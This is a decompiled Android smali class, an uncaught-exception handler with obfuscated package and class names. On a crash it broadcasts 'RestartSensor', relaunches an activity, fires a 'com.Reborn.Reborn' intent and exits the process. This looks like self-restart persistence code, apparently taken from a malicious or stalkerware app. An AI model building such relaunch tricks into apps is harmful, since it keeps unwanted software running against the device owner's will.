.class public Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;
.super Ljava/lang/Object;
.source "etepaejhucdoifemyubbjerbt19.java"

# interfaces
.implements Ljava/lang/Thread$UncaughtExceptionHandler;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "MyExceptionHandler"
.end annotation


# instance fields
.field private final myActivityClass:Ljava/lang/Class;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation
.end field

.field private final myContext:Landroid/content/Context;

.field final synthetic this$0:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;


# direct methods
.method public constructor <init>(Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;Landroid/content/Context;Ljava/lang/Class;)V
    .locals 0
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/Context;",
            "Ljava/lang/Class<",
            "*>;)V"
        }
    .end annotation

    .line 76
    iput-object p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 77
    iput-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myContext:Landroid/content/Context;

    .line 78
    iput-object p3, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myActivityClass:Ljava/lang/Class;

    return-void
.end method


# virtual methods
.method public uncaughtException(Ljava/lang/Thread;Ljava/lang/Throwable;)V
    .locals 2

    .line 84
    :try_start_0
    iget-object p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myContext:Landroid/content/Context;

    const-string p2, "Error"

    const-wide/32 v0, 0x2bf20

    invoke-static {p1, p2, v0, v1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt13;->phonixeffect(Landroid/content/Context;Ljava/lang/String;J)V

    .line 86
    iget-object p1, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;

    new-instance p2, Landroid/content/Intent;

    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->this$0:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;

    invoke-virtual {v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-class v1, Lginom/alfa/lib/scan/SensorRestarterBroadcastReceiver;

    invoke-direct {p2, v0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "RestartSensor"

    invoke-virtual {p2, v0}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p2

    invoke-virtual {p1, p2}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19;->sendBroadcast(Landroid/content/Intent;)V

    .line 88
    new-instance p1, Landroid/content/Intent;

    iget-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myContext:Landroid/content/Context;

    iget-object v0, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myActivityClass:Ljava/lang/Class;

    invoke-direct {p1, p2, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 89
    iget-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myContext:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 90
    new-instance p1, Landroid/content/Intent;

    invoke-direct {p1}, Landroid/content/Intent;-><init>()V

    const-string p2, "com.Reborn.Reborn"

    .line 91
    invoke-virtual {p1, p2}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    const/high16 p2, 0x10000000

    .line 92
    invoke-virtual {p1, p2}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;

    .line 93
    iget-object p2, p0, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt19$MyExceptionHandler;->myContext:Landroid/content/Context;

    invoke-virtual {p2, p1}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    const/4 p1, 0x0

    .line 95
    invoke-static {p1}, Ljava/lang/System;->exit(I)V

    return-void
.end method
